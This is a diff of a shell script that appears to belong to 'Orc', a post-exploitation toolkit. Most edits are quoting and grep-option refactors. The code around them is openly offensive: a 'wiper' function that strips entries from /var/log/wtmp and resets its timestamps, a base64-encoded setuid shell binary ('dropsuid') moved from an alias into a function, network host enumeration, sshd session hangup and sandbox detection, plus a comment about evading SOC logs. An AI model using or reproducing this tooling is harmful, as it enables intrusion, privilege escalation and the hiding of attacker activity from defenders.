@@ -39,6 +39,25 @@ orc_noop() {
   return
 }
 
+
+# Variable orc_colorNever
+#
+# Some modern grep tools uses colored output. With the switch
+# --color=never the colored output is switched of. Old grep
+# tools, like busybox grep, never uses color and don't
+# understand the --color switch
+# The variable orc_colorNever is use to support both grep
+# tools.
+# Usage: grep $orc_colorNever ...
+# Use the variable with out quotation. With quotes the empty
+# string will be used as argument.
+if echo 'test' | grep --color=never -q 'test' 2> /dev/null; then
+  orc_colorNever='--color=never'
+else
+  orc_colorNever=''
+fi
+
+
 # orc_existsTestCommand
 #
 # A check for a program or shell command could be executed
@@ -62,6 +81,7 @@ if ! orc_existsTestCommand cp > /dev/null 2> /dev/null; then
   echo 'Error: can not find a tool for program exist checks' >&2
 fi
 
+
 orc_existsProg () {
   # Checks if a program/command exists.
   # Argument: Program/command name to check.
@@ -82,9 +102,9 @@ orc_listArp() {
   if orc_existsProg arp; then
     # use short switches -a, -n because the long versions are not
     # supported on all systems, e.g. on busybox.
-    arp -na | grep -iv 'incomplete' | orc_filterIpAddress
+    arp -na | grep $orc_colorNever -iv 'incomplete' | orc_filterIpAddress
   elif orc_existsProg ip; then
-    ip neigh show | grep -iv 'FAILED' | orc_filterIpAddress
+    ip neigh show | grep $orc_colorNever -iv 'FAILED' | orc_filterIpAddress
   else
     echo 'Error: Can not list ARP content. Found no tool' >&2
   fi
@@ -236,7 +256,7 @@ orc_tryTcpConnection () {
     bash -c "echo '' > /dev/tcp/$1/$2" 2>/dev/null
   elif orc_existsProg nmap; then
     # TCP connect scan with nmap
-    nmap -oG - -Pn -sT -p "$2" "$1" | grep -q "/open/tcp/"
+    nmap -oG - -Pn -sT -p "$2" "$1" | grep -q '/open/tcp/'
   elif orc_existsProg perl; then
     perl -e 'use IO::Socket;
              $s = IO::Socket::INET->new(
@@ -262,10 +282,6 @@ sys.exit(0)
     # Do not use option -N here because not all nc implementations support
     # this (e.g. busybox).
     echo '' | nc -w1 "$1" "$2" 2>/dev/null
-  elif orc_existsProg bash; then
-    # Open a connection with the bash.
-    # This is a bash extension. POSIX shell will not support this.
-    bash -c "echo '' > /dev/tcp/$1/$2" 2>/dev/null
   else
     echo 'Error: no tool to open TCP connection found' >&2
     return 1
@@ -287,7 +303,7 @@ orc_listtmp() {
     echo "$TMPDIR";
     echo "$HOME";
     echo "$NHOME";
-    echo "/root";
+    echo '/root';
   } |
   # filter: filesystem tmpfs and each directory only once
   awk '(NF==1 || $1=="tmpfs") && hit[$NF]==0 {hit[$NF]=1; print $NF}' |
@@ -314,7 +330,7 @@ orc_makeHome() {
     # Also possible to reuse an existing directory
     if [ -d "$base/.q" ]; then
       # try to create an executable
-      echo "test" > "$base/.q/.t"
+      echo 'test' > "$base/.q/.t"
       chmod +x "$base/.q/.t"
       if [ ! -x "$base/.q/.t" ]; then
 	# can not create a executable
@@ -402,7 +418,7 @@ trap 'rm -rf $HOME' EXIT TERM INT
 
 # Creates a copy of this scipt in variable backup
 # Should be start like "ENV=o.rc sh -i".
-backup=""
+backup=''
 if [ -n "$BASH" ]; then
   # Script runs in bash. Here BASH_SOURCE exists.
   # shellcheck disable=SC2169,SC2039
@@ -419,7 +435,7 @@ fi
 if [ -z "$backup" ]; then
   echo 'Warning: backup variable with script file is not available' >&2
 fi
-NHOME=""
+NHOME=''
 
 
 orc_createEchoFile () {
@@ -549,7 +565,7 @@ orc_isMinimalOsVersion() {
   #         2 if OS name is equal but version is less.
   orc_local first rest
   if [ $# -ne 3 ]; then
-    echo "Error: missing arguments: name, version1, version2" >&2
+    echo 'Error: missing arguments: name, version1, version2' >&2
     return 9
   fi
   # use the short options -s and -n because not all uname tools
@@ -701,7 +717,7 @@ orc_IP4toInteger() {
   fi
   # get first number by removing the last 3 numbers
   value=${1%.*.*.*}
-  if [ "$value" = "" ]; then
+  if [ "$value" = '' ]; then
     echo 'Error: no IPv4 address given' >&2
     return 1
   fi
@@ -973,11 +989,11 @@ getuservices() {
 
 getluks() {
 if orc_existsProg lsblk; then
-	if lsblk -al | awk '{print $6}' | grep -q "crypt"; then
+	if lsblk -al | awk '{print $6}' | grep -q 'crypt'; then
 	echo "Encrypted partition detected. Run lsblk to see more."
 	fi
 elif orc_existsProg dmesg; then
-	if dmesg -T | grep -i Boot_image | grep -qi "rd.luks.uuid"; then
+	if dmesg -T | grep -i Boot_image | grep -qi 'rd.luks.uuid'; then
 	echo "Encrypted partition detected. No lsblk found. Investigate manual."
 	fi
 fi
@@ -987,9 +1003,9 @@ getspec() {
 printf "RAM available: "
 free -hm | tr '\n' ' ' | awk '{ print $8 }'
 printf "CPU model:"
-grep --color=never name /proc/cpuinfo | head -n 1 | awk -F ":" '{print $2}'
+grep $orc_colorNever name /proc/cpuinfo | head -n 1 | awk -F ":" '{print $2}'
 printf "Number of cores: "
-grep --color=never -c processor /proc/cpuinfo
+grep $orc_colorNever -c processor /proc/cpuinfo
 printf "Disk usage:"
 df -h
 }
@@ -1040,7 +1056,7 @@ qssh() {
     echo 'Error: qssh needs at least password and command as arguments' >&2
     return 1
   fi
-  if tty | grep -q "not"; then
+  if tty | grep -q 'not'; then
     orc_createEchoFile "$1"
     shift
     # shellcheck disable=SC2029
@@ -1198,7 +1214,7 @@ psgrep() {
   # TODO: make a more specific grep with pgrep.
   # The simple grep searchs in all parts of the ps output.
   # shellcheck disable=2009
-  ps -weFH | grep "$1" | grep -v grep
+  ps -weFH | grep $orc_colorNever "$1" | grep $orc_colorNever -v 'grep'
 }
 
 getescape() {
@@ -1216,19 +1232,19 @@ echo "Checking to see if we're in one giant simulation..."
 	TTT=1
 	echo "We're in a chroot."
 	fi
-	if grep -qi "hypervisor" /proc/cpuinfo; then
+	if grep -qi 'hypervisor' /proc/cpuinfo; then
 	echo "Virtual machine!"
 	TTT=1
 	fi
-	if dmesg | grep -qi "hypervisor"; then
+	if dmesg | grep -qi 'hypervisor'; then
 	echo "Virtual machine!"
 	TTT=1
 	fi
-	if dmesg | grep -qi "vboxvideo"; then
+	if dmesg | grep -qi 'vboxvideo'; then
         echo "Virtual machine! (Virtualbox)"
         TTT=1
         fi
-	if echo $TTT | grep -vq "1"; then
+	if echo $TTT | grep -vq '1'; then
 	echo "Bare metal!"
 	fi
 }
@@ -1266,17 +1282,17 @@ fpssh() {
 
 getip() {
 #we use akamai and google here because they're gonna look less dodgy in SOC's lolgs
-echo "Attempting to get IP..."
-printf "HTTP says: "
+echo 'Attempting to get IP...'
+printf 'HTTP says: '
 	orc_loadURL 'https://whatismyip.akamai.com'
-echo ""
-printf "DNS says: "
+echo ''
+printf 'DNS says: '
 	if orc_existsProg dig; then
 	dig TXT +short o-o.myaddr.l.google.com @ns1.google.com | tr -d \"
-	echo "(used dig)"
+	echo '(used dig)'
 	else
-	host -t txt o-o.myaddr.l.google.com ns1.google.com | grep descriptive | awk -F ' ' '{print $4}' | tr -d '"' | tr -d "\n"
-	echo "(used host)"
+	host -t txt o-o.myaddr.l.google.com ns1.google.com | grep $orc_colorNever descriptive | awk -F ' ' '{print $4}' | tr -d '"' | tr -d "\n"
+	echo '(used host)'
 	fi
 }
 
@@ -1298,7 +1314,7 @@ getnet() {
   echo 'Pinging broadcast.'
   echo 'Please wait...'
   orc_pingBroadcast
-  echo "Broadcast ping is done."
+  echo 'Broadcast ping is done.'
   echo "Pulling known hosts from some files and writing to $HOME/kh ..."
   orc_collectOtherHostsInfo
   echo "Pinging local IPv4 addresse in background writing $HOME/ips ..."
@@ -1319,7 +1335,7 @@ wiper() {
     echo 'Error: wiper needs grep pattern as argument' >&2
     return 1
   fi
-  utmpdump /var/log/wtmp | grep -v "$1" > "$HOME/.l"
+  utmpdump /var/log/wtmp | grep $orc_colorNever -v "$1" > "$HOME/.l"
   touch -r /var/log/wtmp "$HOME/.l"
   utmpdump -r -o /var/log/wtmp "$HOME/.l"
   touch -r "$HOME/.l" /var/log/wtmp
@@ -1366,7 +1382,7 @@ hangup() {
       continue
     fi
     echo "Owner of $PTS_NAME is $OWNER"
-    SSHD_PID=$(pgrep -a sshd | grep "$PTS_NAME" | cut -d ' ' -f 1)
+    SSHD_PID=$(pgrep -a sshd | grep $orc_colorNever "$PTS_NAME" | cut -d ' ' -f 1)
     if [ "$SSHD_PID" = "" ]; then
       echo "Error: can't find SSHD PID of $PTS_NAME" >&2
       continue
@@ -1408,10 +1424,10 @@ getenum() {
   printf 'Kernel: '
   uname -rv
   printf 'glibc: '
-  readonly libcv="$(ldd "$(command -v id)" | grep --color=never libc.so | awk -F " " '{print $3}') | grep --color=never -i version | grep -v crypt)"
+  readonly libcv="$(ldd "$(command -v id)" | grep $orc_colorNever libc.so | awk -F " " '{print $3}') | grep $orc_colorNever -i version | grep $orc_colorNever -v crypt)"
   $libcv
   printf 'dbus: '
-  dbus-daemon --version | grep --color=never Daemon
+  dbus-daemon --version | grep $orc_colorNever Daemon
   printf 'Init system is: '
   # print the true command name of process 1.
   # ps -p 1 is not supported by all systems, e.g. the busybox.
@@ -1444,6 +1460,34 @@ gettmp () {
     fi
   done
 }
+
+
+
+dropsuid() {
+  # drops tiny suid shell
+  # usage: dropsuid > [file]
+  if ! orc_existsProg base64; then
+    echo 'Error: need base64, can not decode tool' >&2
+  fi
+  base64 -d << ====end
+f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
+AAAAAIAECACABAgHAAAABwAAAAUAAAAAEAAA6AEAAADpWJCDwAxQw7sAAAAA6bgXAAAAzYDrAem7
+iIAECLgLAAAAMckx0usB6THJzYAAAC9iaW4vc2g=
+====end
+}
+
+
+tools() {
+  # Check for common tools.
+  # Arguments: none
+  # Prints report to stdout
+  if ! orc_existsProg type; then
+    echo 'Error: need type, other check methods not yet implemented' >&2
+  fi
+  # shellcheck disable=SC2039
+  type dig perl python gcc nc openssl wget strace gcore nmap gdb curl wget tcpdump
+  return 0
+  }
 
 
 gethelp() {
@@ -1493,10 +1537,6 @@ A probably non-comprehensive list of functionality in Orc v$OVERSION.
 cd "$HOME" || exit
 
 alias 'stomp'='touch -r'
-alias 'tools'='type dig perl python gcc nc openssl wget strace gcore nmap gdb curl wget tcpdump'
-alias 'dropsuid'='echo "f0VMRgEBAQAAAAAAAAAAAAIAAwABAAAAVIAECDQAAAAAAAAAAAAAADQAIAABAAAAAAAAAAEAAAAA
-AAAAAIAECACABAgHAAAABwAAAAUAAAAAEAAA6AEAAADpWJCDwAxQw7sAAAAA6bgXAAAAzYDrAem7
-iIAECLgLAAAAMckx0usB6THJzYAAAC9iaW4vc2g=" | base64 -d'
 alias 'psfull'='ps -weFH'
 alias 'listener'='netstat -peanuto'
 alias 'netgrep'='netstat -peanuto | grep'
@@ -1530,9 +1570,9 @@ echo "Short kernel info: "
 uname -rni
 echo "IP address on the network: "
 	if orc_existsProg ifconfig; then
-	ifconfig | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
+	ifconfig | grep $orc_colorNever inet | grep $orc_colorNever -v inet6 | awk -F " " '{ print $2 }' | grep $orc_colorNever -v 127 | grep $orc_colorNever -v "::1$"
 	else
-	ip addr show | grep inet | grep -v inet6 | awk -F " " '{ print $2 }' | grep -v 127 | grep -v "::1$"
+	ip addr show | grep $orc_colorNever inet | grep $orc_colorNever -v inet6 | awk -F " " '{ print $2 }' | grep $orc_colorNever -v 127 | grep $orc_colorNever -v "::1$"
 	fi
 printf "We are %s - (%s)\n" "$(id -u)" "$(id -nu)"
 printf "Machine has been "
